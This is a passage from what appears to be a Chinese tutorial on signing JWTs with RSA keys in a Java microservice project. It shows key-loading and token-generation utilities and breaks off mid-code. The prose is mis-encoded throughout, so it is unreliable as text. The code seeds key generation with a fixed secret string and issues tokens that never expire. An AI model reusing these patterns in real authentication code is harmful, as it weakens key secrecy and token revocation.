<p>å¯ä»¥å‘ç°ï¼Œç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„ç½‘ç«™ï¼Œä¸€æ¬¡æˆæƒåï¼Œä»¥åè®¿é—®å¾®æœåŠ¡éƒ½éœ€è¦é‰´æƒï¼Œé‚£ä¹ˆ<strong>æ¯æ¬¡é‰´æƒéƒ½éœ€è¦è®¿é—®æˆæƒä¸­å¿ƒ</strong>ï¼Œä¸€ä¸ªç”¨æˆ·è¯·æ±‚ï¼Œè¢«åˆ†è§£ä¸º2æ¬¡è¯·æ±‚æ‰èƒ½å®Œæˆï¼Œæ•ˆç‡æ¯”è¾ƒä½ã€‚</p>
<p>èƒ½ä¸èƒ½ç›´æ¥åœ¨å¾®æœåŠ¡çš„å®Œæˆé‰´æƒï¼Œä¸å»æ‰¾æˆæƒä¸­å¿ƒå‘¢ï¼Ÿ</p>
<p>å¦‚æœè¿™æ ·ï¼Œå°±å¯ä»¥å‡å°‘ä¸€æ¬¡ç½‘ç»œè¯·æ±‚ï¼Œæ•ˆç‡æé«˜äº†ä¸€å€ã€‚ä½†æ˜¯ï¼Œ**<code>å¾®æœåŠ¡å¹¶æ²¡æœ‰é‰´å®šJWTçš„èƒ½åŠ›</code>**ï¼Œå› ä¸ºé‰´å®šéœ€è¦é€šè¿‡å¯†é’¥æ¥å®Œæˆã€‚æˆ‘ä»¬ä¸èƒ½æŠŠå¯†é’¥(HMAC with SHA-256)äº¤ç»™å…¶å®ƒå¾®æœåŠ¡ï¼Œå­˜åœ¨å®‰å…¨é£é™©ã€‚</p>
<p>æ€ä¹ˆåŠï¼Ÿ</p>
<p>è¿™å°±è¦ç”¨åˆ°RSAéå¯¹ç§°åŠ å¯†æŠ€æœ¯äº†ã€‚</p>
<h3 id="éå¯¹ç§°åŠ å¯†éªŒç­¾"><a href="#éå¯¹ç§°åŠ å¯†éªŒç­¾" class="headerlink" title="éå¯¹ç§°åŠ å¯†éªŒç­¾"></a>éå¯¹ç§°åŠ å¯†éªŒç­¾</h3><h4 id="åŠ å¯†æŠ€æœ¯çš„ç±»å‹"><a href="#åŠ å¯†æŠ€æœ¯çš„ç±»å‹" class="headerlink" title="åŠ å¯†æŠ€æœ¯çš„ç±»å‹"></a>åŠ å¯†æŠ€æœ¯çš„ç±»å‹</h4><p>åŠ å¯†æŠ€æœ¯æ˜¯å¯¹ä¿¡æ¯è¿›è¡Œç¼–ç å’Œè§£ç çš„æŠ€æœ¯ï¼Œç¼–ç æ˜¯æŠŠåŸæ¥å¯è¯»ä¿¡æ¯ï¼ˆåˆç§°æ˜æ–‡ï¼‰è¯‘æˆä»£ç å½¢å¼ï¼ˆåˆç§°å¯†æ–‡ï¼‰ï¼Œå…¶é€†è¿‡ç¨‹å°±æ˜¯è§£ç ï¼ˆè§£å¯†ï¼‰ï¼ŒåŠ å¯†æŠ€æœ¯çš„è¦ç‚¹æ˜¯åŠ å¯†ç®—æ³•ï¼ŒåŠ å¯†ç®—æ³•å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼š  </p>
<ul>
<li>å¯¹ç§°åŠ å¯†ï¼Œå¦‚AES<ul>
<li>åŸºæœ¬åŸç†ï¼šå°†æ˜æ–‡åˆ†æˆNä¸ªç»„ï¼Œç„¶åä½¿ç”¨å¯†é’¥å¯¹å„ä¸ªç»„è¿›è¡ŒåŠ å¯†ï¼Œå½¢æˆå„è‡ªçš„å¯†æ–‡ï¼Œæœ€åæŠŠæ‰€æœ‰çš„åˆ†ç»„å¯†æ–‡è¿›è¡Œåˆå¹¶ï¼Œå½¢æˆæœ€ç»ˆçš„å¯†æ–‡ã€‚</li>
<li>ä¼˜åŠ¿ï¼šç®—æ³•å…¬å¼€ã€è®¡ç®—é‡å°ã€åŠ å¯†é€Ÿåº¦å¿«ã€åŠ å¯†æ•ˆç‡é«˜</li>
<li>ç¼ºé™·ï¼šåŒæ–¹éƒ½ä½¿ç”¨åŒæ ·å¯†é’¥ï¼Œå®‰å…¨æ€§å¾—ä¸åˆ°ä¿è¯</li>
</ul>
</li>
<li>éå¯¹ç§°åŠ å¯†ï¼Œå¦‚RSA<ul>
<li>åŸºæœ¬åŸç†ï¼šåŒæ—¶ç”Ÿæˆä¸¤æŠŠå¯†é’¥ï¼šç§é’¥å’Œå…¬é’¥ï¼Œç§é’¥éšç§˜ä¿å­˜ï¼Œå…¬é’¥å¯ä»¥ä¸‹å‘ç»™ä¿¡ä»»å®¢æˆ·ç«¯<ul>
<li>ç§é’¥å¯ä»¥è§£å¯†å…¬é’¥æˆ–ç§é’¥åŠ å¯†çš„æ•°æ®</li>
<li>å…¬é’¥åªèƒ½è§£å¯†ç§é’¥åŠ å¯†çš„æ•°æ®</li>
</ul>
</li>
<li>ä¼˜ç‚¹ï¼šå®‰å…¨ï¼Œéš¾ä»¥ç ´è§£</li>
<li>ç¼ºç‚¹ï¼šç®—æ³•æ¯”è¾ƒè€—æ—¶</li>
</ul>
</li>
</ul>
<p>å“ˆå¸Œè¿ç®—ï¼ˆä¸å¯é€†åŠ å¯†ï¼‰ï¼šå¦‚MD5ï¼ŒSHA</p>
<ul>
<li><p>åŸºæœ¬åŸç†ï¼šåŠ å¯†è¿‡ç¨‹ä¸­ä¸éœ€è¦ä½¿ç”¨<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">å¯†é’¥</a>ï¼Œè¾“å…¥æ˜æ–‡åç”±ç³»ç»Ÿç›´æ¥ç»è¿‡åŠ å¯†ç®—æ³•å¤„ç†æˆå¯†æ–‡ï¼Œè¿™ç§åŠ å¯†åçš„æ•°æ®æ˜¯æ— æ³•è¢«è§£å¯†çš„ï¼Œæ— æ³•æ ¹æ®å¯†æ–‡æ¨ç®—å‡ºæ˜æ–‡ã€‚</p>
</li>
<li><p>ä½œç”¨ï¼šéªŒè¯æ•°æ®ä¸€è‡´æ€§</p>
</li>
</ul>
<p>RSAç®—æ³•å†å²ï¼š</p>
<p>1977å¹´ï¼Œä¸‰ä½æ•°å­¦å®¶Rivestã€Shamir å’Œ Adleman è®¾è®¡äº†ä¸€ç§ç®—æ³•ï¼Œå¯ä»¥å®ç°éå¯¹ç§°åŠ å¯†ã€‚è¿™ç§ç®—æ³•ç”¨ä»–ä»¬ä¸‰ä¸ªäººçš„åå­—ç¼©å†™ï¼šRSA</p>
<h4 id="éå¯¹ç§°åŠ å¯†éªŒç­¾-1"><a href="#éå¯¹ç§°åŠ å¯†éªŒç­¾-1" class="headerlink" title="éå¯¹ç§°åŠ å¯†éªŒç­¾"></a>éå¯¹ç§°åŠ å¯†éªŒç­¾</h4><p>æœ‰äº†éå¯¹ç§°åŠ å¯†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å˜ç­¾åå’ŒéªŒç­¾çš„æ–¹å¼äº†ï¼š</p>
<ul>
<li><p>ç”ŸæˆRSAå¯†é’¥å¯¹ï¼Œç§é’¥å­˜æ”¾åœ¨æˆæƒä¸­å¿ƒï¼Œå…¬é’¥ä¸‹å‘ç»™å¾®æœåŠ¡</p>
</li>
<li><p>åœ¨æˆæƒä¸­å¿ƒåˆ©ç”¨ç§é’¥å¯¹JWTç­¾å</p>
</li>
<li><p>åœ¨å¾®æœåŠ¡åˆ©ç”¨å…¬é’¥éªŒè¯ç­¾åæœ‰æ•ˆæ€§</p>
</li>
</ul>
<p>å› ä¸ºéå¯¹ç§°åŠ å¯†çš„ç‰¹æ€§ï¼Œä¸ç”¨æ‹…å¿ƒå…¬é’¥æ³„æ¼é—®é¢˜ï¼Œå› ä¸ºå…¬é’¥æ˜¯æ— æ³•ä¼ªé€ ç­¾åçš„ï¼Œä½†è¦<strong>ç¡®ä¿ç§é’¥çš„å®‰å…¨å’Œéšç§˜</strong>ã€‚</p>
<p>éå¯¹ç§°åŠ å¯†åçš„æˆæƒå’Œé‰´æƒæµç¨‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022674.png" alt="image-20200223120858510"></p>
<p>é‰´æƒéƒ¨åˆ†ç®€åŒ–äº†éå¸¸å¤šï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022675.png" alt="image-20200223121322236"> </p>
<p>ç”¨æˆ·åªéœ€è¦ä¸å¾®æœåŠ¡äº¤äº’ï¼Œä¸ç”¨è®¿é—®æˆæƒä¸­å¿ƒï¼Œæ•ˆç‡å¤§å¤§æé«˜ï¼</p>
<p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬æ’¸èµ·è¢–å­ï¼Œå¼€å§‹å†™ä»£ç å§ï¼</p>
<h2 id="ç¼–å†™JWTå·¥å…·"><a href="#ç¼–å†™JWTå·¥å…·" class="headerlink" title="ç¼–å†™JWTå·¥å…·"></a>ç¼–å†™JWTå·¥å…·</h2><p>å› ä¸ºç”Ÿæˆjwtï¼Œè§£æjwtè¿™æ ·çš„è¡Œä¸ºä»¥ååœ¨å…¶å®ƒå¾®æœåŠ¡ä¸­ä¹Ÿä¼šç”¨åˆ°ï¼Œå› æ­¤æˆ‘ä»¬ä¼šæŠ½å–æˆå·¥å…·ï¼Œæ”¾åˆ°<code>ly-comon</code>ä¸­ã€‚ </p>
<h3 id="RSAå·¥å…·ç±»ï¼š"><a href="#RSAå·¥å…·ç±»ï¼š" class="headerlink" title="RSAå·¥å…·ç±»ï¼š"></a>RSAå·¥å…·ç±»ï¼š</h3><p>æˆ‘ä»¬åœ¨<code>ly-common</code>ä¸­çš„<code>com.leyou.common.utils</code>åŒ…ä¸‹åˆ›å»ºä¸€ä¸ªå·¥å…·ç±»ï¼Œæ–¹ä¾¿åšéå¯¹ç§°åŠ å¯†ã€‚</p>
<p>RSAå·¥å…·ç±»è´Ÿè´£å¯¹RSAå¯†é’¥çš„åˆ›å»ºã€è¯»å–åŠŸèƒ½ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.PKCS8EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.X509EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ace on 2018/5/10.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> HuYi.Zhang</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RsaUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_KEY_SIZE</span> <span class="operator">=</span> <span class="number">2048</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä»æ–‡ä»¶ä¸­è¯»å–å…¬é’¥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filename å…¬é’¥ä¿å­˜è·¯å¾„ï¼Œç›¸å¯¹äºclasspath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> å…¬é’¥å¯¹è±¡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PublicKey <span class="title function_">getPublicKey</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = readFile(filename);</span><br><span class="line">        <span class="keyword">return</span> getPublicKey(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä»æ–‡ä»¶ä¸­è¯»å–å¯†é’¥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filename ç§é’¥ä¿å­˜è·¯å¾„ï¼Œç›¸å¯¹äºclasspath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ç§é’¥å¯¹è±¡</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = readFile(filename);</span><br><span class="line">        <span class="keyword">return</span> getPrivateKey(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–å…¬é’¥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes å…¬é’¥çš„å­—èŠ‚å½¢å¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PublicKey <span class="title function_">getPublicKey</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        bytes = Base64.getDecoder().decode(bytes);</span><br><span class="line">        <span class="type">X509EncodedKeySpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">X509EncodedKeySpec</span>(bytes);</span><br><span class="line">        <span class="type">KeyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> KeyFactory.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> factory.generatePublic(spec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è·å–å¯†é’¥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes ç§é’¥çš„å­—èŠ‚å½¢å¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">        bytes = Base64.getDecoder().decode(bytes);</span><br><span class="line">        <span class="type">PKCS8EncodedKeySpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PKCS8EncodedKeySpec</span>(bytes);</span><br><span class="line">        <span class="type">KeyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> KeyFactory.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> factory.generatePrivate(spec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ®å¯†æ–‡ï¼Œç”Ÿå­˜rsaå…¬é’¥å’Œç§é’¥,å¹¶å†™å…¥æŒ‡å®šæ–‡ä»¶</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKeyFilename  å…¬é’¥æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKeyFilename ç§é’¥æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> secret             ç”Ÿæˆå¯†é’¥çš„å¯†æ–‡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">generateKey</span><span class="params">(String publicKeyFilename, String privateKeyFilename, String secret)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        <span class="type">SecureRandom</span> <span class="variable">secureRandom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>(secret.getBytes());</span><br><span class="line">        keyPairGenerator.initialize(DEFAULT_KEY_SIZE, secureRandom);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="comment">// è·å–å…¬é’¥å¹¶å†™å‡º</span></span><br><span class="line">        <span class="type">byte</span>[] publicKeyBytes = keyPair.getPublic().getEncoded();</span><br><span class="line">        publicKeyBytes = Base64.getEncoder().encode(publicKeyBytes);</span><br><span class="line">        writeFile(publicKeyFilename, publicKeyBytes);</span><br><span class="line">        <span class="comment">// è·å–ç§é’¥å¹¶å†™å‡º</span></span><br><span class="line">        <span class="type">byte</span>[] privateKeyBytes = keyPair.getPrivate().getEncoded();</span><br><span class="line">        privateKeyBytes = Base64.getEncoder().encode(privateKeyBytes);</span><br><span class="line">        writeFile(privateKeyFilename, privateKeyBytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] readFile(String fileName) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(<span class="keyword">new</span> <span class="title class_">File</span>(fileName).toPath());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String destPath, <span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(destPath);</span><br><span class="line">        <span class="keyword">if</span> (!dest.exists()) &#123;</span><br><span class="line">            dest.createNewFile();</span><br><span class="line">        &#125;</span><br><span class="line">        Files.write(dest.toPath(), bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JWTå·¥å…·ç±»"><a href="#JWTå·¥å…·ç±»" class="headerlink" title="JWTå·¥å…·ç±»"></a>JWTå·¥å…·ç±»</h3><h4 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h4><p>æˆ‘ä»¬éœ€è¦å…ˆåœ¨<code>ly-common</code>ä¸­å¼•å…¥JWTä¾èµ–ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="è½½è·å¯¹è±¡"><a href="#è½½è·å¯¹è±¡" class="headerlink" title="è½½è·å¯¹è±¡"></a>è½½è·å¯¹è±¡</h4><p>JWTä¸­ï¼Œä¼šä¿å­˜è½½è·æ•°æ®ï¼Œæˆ‘ä»¬è®¡åˆ’å­˜å‚¨3éƒ¨åˆ†ï¼š</p>
<ul>
<li>idï¼šjwtçš„id</li>
<li>ç”¨æˆ·ä¿¡æ¯ï¼šç”¨æˆ·æ•°æ®ï¼Œä¸ç¡®å®šï¼Œå¯ä»¥æ˜¯ä»»æ„ç±»å‹</li>
<li>è¿‡æœŸæ—¶é—´ï¼šDate</li>
</ul>
<p>ä¸ºäº†æ–¹ä¾¿åæœŸè·å–ï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç±»æ¥å°è£…ã€‚</p>
<p>åœ¨<code>ly-common</code>çš„<code>com.leyou.common.entity</code>åŒ…ä¸‹æ·»åŠ ä¸€ä¸ªå®ä½“ç±»ï¼Œä»£è¡¨è½½è·ä¿¡æ¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * tokençš„å”¯ä¸€æ ‡ç¤º,JTI</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿‡æœŸæ—¶é—´</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Date expiration;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> T userInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><p>jtiç”¨UUID</p>
<p>åœ¨<code>ly-common</code>çš„<code>com.leyou.common.utils</code>åŒ…ä¸­ï¼Œæ·»åŠ æ–°å·¥å…·ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jws;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.io.Decoder;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.io.Decoders;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.DateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  HuYi.Zhang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>  2018-05-26 15:43</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PAYLOAD_USER_KEY</span> <span class="operator">=</span> <span class="string">&quot;user&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç§é’¥åŠ å¯†ç”Ÿæˆtokenï¼Œæ°¸ä¹…æœ‰æ•ˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userInfo   è½½è·ä¸­çš„æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKey ç§é’¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(Object userInfo, PrivateKey privateKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .claim(JWT_PAYLOAD_USER_KEY, JsonUtils.toJson(userInfo))</span><br><span class="line">                .setId(createJTI())</span><br><span class="line">                .signWith(privateKey, SignatureAlgorithm.RS256)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç§é’¥åŠ å¯†ç”Ÿæˆtokenï¼Œæ°¸ä¹…æœ‰æ•ˆ</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userInfo   è½½è·ä¸­çš„æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKey ç§é’¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTokenWithJTI</span><span class="params">(Object userInfo, String jti, PrivateKey privateKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .claim(JWT_PAYLOAD_USER_KEY, JsonUtils.toJson(userInfo))</span><br><span class="line">                .setId(jti)</span><br><span class="line">                .signWith(privateKey, SignatureAlgorithm.RS256)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç§é’¥åŠ å¯†ç”Ÿæˆtokenï¼ŒæŒ‡å®šè¿‡æœŸæ—¶é—´</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userInfo   è½½è·ä¸­çš„æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKey ç§é’¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expire     è¿‡æœŸæ—¶é—´ï¼Œå•ä½ç§’</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTokenExpireInSeconds</span><span class="params">(Object userInfo, PrivateKey privateKey, <span class="type">int</span> expire)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .claim(JWT_PAYLOAD_USER_KEY, JsonUtils.toJson(userInfo))</span><br><span class="line">                .setId(createJTI())</span><br><span class="line">                .setExpiration(DateTime.now().plusSeconds(expire).toDate())</span><br><span class="line">                .signWith(privateKey, SignatureAlgorithm.RS256)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å…¬é’¥è§£ætoken</span></span><br><span class="line"><span class="comment">     